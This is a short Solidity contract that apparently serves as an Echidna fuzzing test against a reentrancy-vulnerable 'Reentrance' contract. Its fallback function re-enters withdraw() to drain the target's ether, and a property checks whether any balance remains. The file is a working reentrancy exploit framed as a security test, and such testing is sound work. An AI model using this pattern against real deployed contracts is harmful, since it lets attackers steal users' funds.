pragma solidity ^0.6.0;

import 'Reentrancy.sol';

contract Test {
  Reentrance target;

  constructor() public payable {
    target = new Reentrance();
    target.donate.value(10 ether)(address(0x12345));
  }

  function donate() public {
    target.donate.value(1 ether)(address(this));
  }

  function pwn() public {
    target.withdraw(1 ether);
  }

  fallback() external payable {
    uint steal = address(msg.sender).balance;
    steal = steal > 1 ether ? 1 ether : steal;
    if (steal != 0)
      address(msg.sender).call(abi.encodeWithSignature("withdraw(uint256)", steal));
  }

  function echidna_test_balance() public returns (bool) {
    return address(target).balance > 0;
  }
}